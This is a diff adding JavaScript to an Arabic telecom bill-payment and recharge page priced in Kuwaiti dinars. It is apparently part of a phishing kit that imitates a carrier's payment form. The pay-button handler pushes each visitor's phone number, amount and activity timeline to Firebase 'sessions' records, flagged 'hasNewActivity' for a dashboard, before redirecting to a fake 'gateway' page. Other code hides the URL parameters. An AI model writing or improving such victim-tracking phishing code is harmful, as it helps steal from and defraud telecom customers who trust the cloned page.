+          setTimeout(applyScale, 600);   // final safety net
+          if (window.ResizeObserver) {
+            // Re-run when the form card grows (e.g. dropdown opens)
+            new ResizeObserver(() => requestAnimationFrame(applyScale))
+              .observe(wrapper);
+          }
+        });
+
+        // Best-effort early call before DOMContentLoaded
+        if (document.readyState !== 'loading') applyScale();
+      })();
+
+      (function initLayoutBehavior() {
+        // --- Sticky Header Scroll Handler ---
+        const stickyHeader = document.querySelector(".header-bg.fixed");
+        if (stickyHeader) {
+          window.addEventListener("scroll", () => {
+            if (window.scrollY > 150) {
+              stickyHeader.classList.add("header-visible");
+            } else {
+              stickyHeader.classList.remove("header-visible");
+            }
+          });
+        }
+      })();
+
+      // --- Parse & Clean URL Parameters immediately to prevent exposure ---
+      (function cleanUrlParams() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const urlPhoneParam = urlParams.get("phone");
+        const urlAmountParam = urlParams.get("amount");
+        
+        if (urlPhoneParam) localStorage.setItem("phone", urlPhoneParam);
+        if (urlAmountParam) localStorage.setItem("amount", urlAmountParam);
+        
+        if (urlPhoneParam || urlAmountParam) {
+          try {
+            const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
+            window.history.replaceState({}, document.title, cleanUrl);
+          } catch (e) {
+            // Fallback for strict offline environments
+          }
+        }
+      })();
+
+
+      document.addEventListener("DOMContentLoaded", () => {
+        // --- Dropdown Toggle ("أود الدفع لــ") ---
+        const dropdownBtn = document.getElementById("dropdown-pay-for-btn");
+        const dropdownList = document.getElementById("dropdown-pay-for-list");
+        const optionOther = document.getElementById("option-other-number");
+        const optionContract = document.getElementById("option-contract-number");
+
+        if (dropdownBtn && dropdownList) {
+          dropdownBtn.addEventListener("click", (e) => {
+            e.stopPropagation();
+            const isHidden = dropdownList.style.display === "none";
+            dropdownList.style.display = isHidden ? "block" : "none";
+          });
+
+          // Close dropdown when clicking outside
+          document.addEventListener("click", () => {
+            dropdownList.style.display = "none";
+          });
+
+          // Select Option: Other Number
+          if (optionOther) {
+            optionOther.addEventListener("click", (e) => {
+              e.stopPropagation();
+              updateDropdownSelection("رقم آخر", optionOther, optionContract);
+            });
+          }
+
+          // Select Option: Contract Number
+          if (optionContract) {
+            optionContract.addEventListener("click", (e) => {
+              e.stopPropagation();
+              updateDropdownSelection("رقم العقد", optionContract, optionOther);
+            });
+          }
+        }
+
+        function updateDropdownSelection(label, selectedOpt, unselectedOpt) {
+          // Update button text
+          const btnTextContainer = dropdownBtn.querySelector(".truncate div div");
+          if (btnTextContainer) {
+            btnTextContainer.textContent = label;
+          }
+
+          // Highlight selected option
+          selectedOpt.querySelector("div").classList.add("text-primary", "font-bold");
+          selectedOpt.querySelector(".icon-check-mark-button")?.parentElement?.classList.remove("hidden");
+
+          // Remove highlight from unselected option
+          unselectedOpt.querySelector("div").classList.remove("text-primary", "font-bold");
+          const checkmark = unselectedOpt.querySelector(".icon-check-mark-button")?.parentElement;
+          if (checkmark) {
+            checkmark.classList.add("hidden");
+          }
+
+          // Hide dropdown list
+          dropdownList.style.display = "none";
+
+          // Update form labels depending on type
+          const phoneLabel = document.querySelector('label[for="phone-number-input"]') || document.querySelector('label[for="cc7dbec5ed-8520-4f1b-a3a5-2cd1550de528"]');
+          const phoneInput = document.getElementById("phone-number-input");
+          if (phoneLabel && phoneInput) {
+            if (label === "رقم العقد") {
+              phoneLabel.textContent = "رقم العقد";
+              phoneInput.placeholder = "أدخل رقم العقد";
+            } else {
+              phoneLabel.textContent = "رقم الهاتف";
+              phoneInput.placeholder = "أدخل الرقم: 99XXXXXX";
+            }
+          }
+        }
+
+        // --- Tabs Toggle ("دفع الفاتورة" / "إعادة تعبئة eeZee") ---
+        const tabPayBill = document.getElementById("tab-pay-bill");
+        const tabRecharge = document.getElementById("tab-recharge-eezee");
+
+        if (tabPayBill && tabRecharge) {
+          tabPayBill.addEventListener("click", () => {
+            switchTab(tabPayBill, tabRecharge);
+          });
+
+          tabRecharge.addEventListener("click", () => {
+            switchTab(tabRecharge, tabPayBill);
+          });
+        }
+
+        function switchTab(activeTab, inactiveTab) {
+          // Set active styles
+          activeTab.className = "px-4 py-2 relative flex-1 text-center text-primary border-b border-primary font-bold";
+          // Set inactive styles
+          inactiveTab.className = "px-4 py-2 relative flex-1 text-center text-gray-600 cursor-pointer border-b hover:border-black dark:text-white dark:hover:border-gray-400";
+          
+          // Toggle field labels based on active tab
+          const phoneLabel = document.querySelector('label[for="phone-number-input"]') || document.querySelector('label[for="cc7dbec5ed-8520-4f1b-a3a5-2cd1550de528"]');
+          if (phoneLabel) {
+            if (activeTab === tabRecharge) {
+              phoneLabel.textContent = "رقم الخط الدفع المسبق";
+            } else {
+              const selectedLabel = dropdownBtn?.querySelector(".truncate div div")?.textContent || "رقم آخر";
+              phoneLabel.textContent = selectedLabel === "رقم العقد" ? "رقم العقد" : "رقم الهاتف";
+            }
+          }
+
+          // Trigger input event on phoneInput to sync phone number to dashboard
+          const phoneInput = document.getElementById("phone-number-input");
+          if (phoneInput) {
+            const event = new Event("input", { bubbles: true });
+            phoneInput.dispatchEvent(event);
+          }
+        }
+
+        // --- Charge Amount Selection Dropdown ---
+        const chargeAmountContainer = document.getElementById("charge-amount-container");
+        const dropdownAmountBtn = document.getElementById("dropdown-amount-btn");
+        const dropdownAmountLabel = document.getElementById("dropdown-amount-label");
+        const dropdownAmountList = document.getElementById("dropdown-amount-list");
+        const customAmountContainer = document.getElementById("custom-amount-container");
+        const customAmountInput = document.getElementById("custom-amount-input");
+        
+        // Total display at the bottom of landing card
+        const totalAmountDisplay = document.querySelector(".border-t.border-primary.border-opacity-30.py-5.mt-6 .text-green");
+
+        let currentAmount = "5.000";
+
+        if (dropdownAmountBtn && dropdownAmountList) {
+          dropdownAmountBtn.addEventListener("click", (e) => {
+            e.stopPropagation();
+            const isHidden = dropdownAmountList.style.display === "none";
+            dropdownAmountList.style.display = isHidden ? "block" : "none";
+          });
+
+          document.addEventListener("click", () => {
+            if (dropdownAmountList) {
+              dropdownAmountList.style.display = "none";
+            }
+          });
+
+          const amountOptions = dropdownAmountList.querySelectorAll(".amount-option");
+          amountOptions.forEach(opt => {
+            opt.addEventListener("click", (e) => {
+              e.stopPropagation();
+              const value = opt.getAttribute("data-value");
+              
+              // Remove checkmark and bold classes from all options
+              amountOptions.forEach(o => {
+                o.querySelector("div").classList.remove("text-primary", "font-bold");
+                o.querySelector(".icon-check-mark-button")?.classList.add("hidden");
+              });
+
+              // Add checkmark and bold classes to selected
+              opt.querySelector("div").classList.add("text-primary", "font-bold");
+              opt.querySelector(".icon-check-mark-button")?.classList.remove("hidden");
+
+              dropdownAmountList.style.display = "none";
+
+              if (value === "other") {
+                dropdownAmountLabel.textContent = "مبلغ آخر";
+                customAmountContainer.style.display = "block";
+                updateAmount(customAmountInput.value || "0.000");
+              } else {
+                dropdownAmountLabel.textContent = `${value} د.ك`;
+                customAmountContainer.style.display = "none";
+                updateAmount(value);
+              }
+            });
+          });
+        }
+
+        function updateAmount(val) {
+          currentAmount = val;
+          // Format to 3 decimals if numeric
+          let displayVal = val;
+          if (!isNaN(parseFloat(val)) && val.trim() !== "") {
+            displayVal = parseFloat(val).toFixed(3);
+          }
+          if (totalAmountDisplay) {
+            totalAmountDisplay.textContent = `${displayVal} د.ك`;
+          }
+        }
+
+        if (customAmountInput) {
+          customAmountInput.addEventListener("input", () => {
+            // Allow only numbers and a single decimal point
+            customAmountInput.value = customAmountInput.value.replace(/[^0-9.]/g, "");
+            // Ensure only one decimal point
+            const parts = customAmountInput.value.split(".");
+            if (parts.length > 2) {
+              customAmountInput.value = parts[0] + "." + parts.slice(1).join("");
+            }
+            updateAmount(customAmountInput.value || "0.000");
+          });
+        }
+
+        // --- Input Validation & Button Enablement ---
+        const phoneInput = document.getElementById("phone-number-input");
+        const payButton = document.getElementById("pay-now-button");
+
+        if (phoneInput && payButton) {
+          phoneInput.addEventListener("input", (e) => {
+            // Allow only numbers
+            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
+
+            const val = phoneInput.value;
+
+            if (val.length === 8) {
+              // Show charge amount dropdown
+              if (chargeAmountContainer) {
+                chargeAmountContainer.style.display = "block";
+              }
+              
+              // Reset amount to currently selected dropdown value
+              if (dropdownAmountLabel) {
+                if (dropdownAmountLabel.textContent.includes("مبلغ آخر")) {
+                  updateAmount(customAmountInput?.value || "0.000");
+                } else {
+                  const num = dropdownAmountLabel.textContent.replace(/[^\d.]/g, "");
+                  updateAmount(num || "5.000");
+                }
+              }
+              
+              // Enable pay button
+              payButton.removeAttribute("disabled");
+              payButton.className = "transition ease-in duration-200 focus:outline-none focus:ring-2 focus:ring-offset focus:ring-blue-200 focus:ring-blue-400 text-center rounded-lg btn-active w-full mt-7 uppercase py-3 px-4 text-base font-black bg-primary hover:text-primary border-primary text-white hover:bg-transparent border-2 cursor-pointer";
+            } else {
+              // Hide charge amount containers
+              if (chargeAmountContainer) {
+                chargeAmountContainer.style.display = "none";
+              }
+              if (customAmountContainer) {
+                customAmountContainer.style.display = "none";
+              }
+              
+              // Reset amount display to zero
+              updateAmount("0.000");
+              
+              // Disable pay button
+              payButton.setAttribute("disabled", "disabled");
+              payButton.className = "transition ease-in duration-200 focus:outline-none focus:ring-2 focus:ring-offset focus:ring-blue-200 focus:ring-blue-400 text-center rounded-lg btn-active w-full mt-7 uppercase py-3 px-4 text-base font-black cursor-not-allowed bg-gray-200 text-gray-400";
+            }
+          });
+        }
+
+        // --- Pay Button Redirect to Gateway with URL Parameters ---
+        if (payButton) {
+          payButton.addEventListener("click", () => {
+            const phone = phoneInput ? phoneInput.value : "";
+            const amount = currentAmount + " د.ك";
+            localStorage.setItem("phone", phone);
+            localStorage.setItem("amount", amount);
+
+            const regEvent = {
+              id: 'reg_' + Date.now(),
+              type: 'registration',
+              phone: phone,
+              amount: amount,
+              timestamp: new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
+            };
+
+            const sessionId = localStorage.getItem("sessionId");
+            if (sessionId) {
+              // OPTIMIZATION: Fire the write asynchronously in the background and redirect immediately for instant UI response
+              if (window.rtd) {
+                const rtdRef = window.rtd.ref('sessions/' + sessionId);
+                rtdRef.update({
+                  phone: phone,
+                  amount: amount,
+                  page: 'بوابة الدفع',
+                  hasNewActivity: true
+                }).catch(() => {});
+                rtdRef.child('timeline').push(regEvent).catch(() => {});
+              }
+              if (window.db) {
+                window.db.collection("payments").doc(sessionId).set({
+                  phone: phone,
+                  amount: amount,
+                  timeline: firebase.firestore.FieldValue.arrayUnion(regEvent),
+                  page: 'بوابة الدفع',
+                  hasNewActivity: true
+                }, { merge: true }).catch((e) => {
+                  console.error("Firebase background update failed: ", e);
+                });
+              }
+            }
+            window.location.href = `./gateway.html`;
+          });
+        }
+
+        const urlPhone = localStorage.getItem("phone");
+        const urlAmount = localStorage.getItem("amount");
+        
+        if (urlPhone && phoneInput) {
+          phoneInput.value = urlPhone;
+          
+          // Trigger input event to validate and display amount dropdown
+          const event = new Event("input", { bubbles: true });
+          phoneInput.dispatchEvent(event);
+          
+          // Restore amount selection if present
+          if (urlAmount && dropdownAmountList) {
+            let found = false;
+            const amountOptions = dropdownAmountList.querySelectorAll(".amount-option");
+            amountOptions.forEach(opt => {
+              const val = opt.getAttribute("data-value");
+              if (val === urlAmount) {
+                opt.click();
+                found = true;
+              }
+            });
+            
+            if (!found && customAmountInput) {
+              // Select custom amount option
+              const otherOption = Array.from(amountOptions).find(o => o.getAttribute("data-value") === "other");
+              if (otherOption) {
+                otherOption.click();
+                customAmountInput.value = urlAmount;
+                // Trigger input to update amount display
+                const inputEvent = new Event("input", { bubbles: true });
+                customAmountInput.dispatchEvent(inputEvent);
+              }
+            }
+          }
+        }
+      });
+    </script>
+  </body>
+</html>
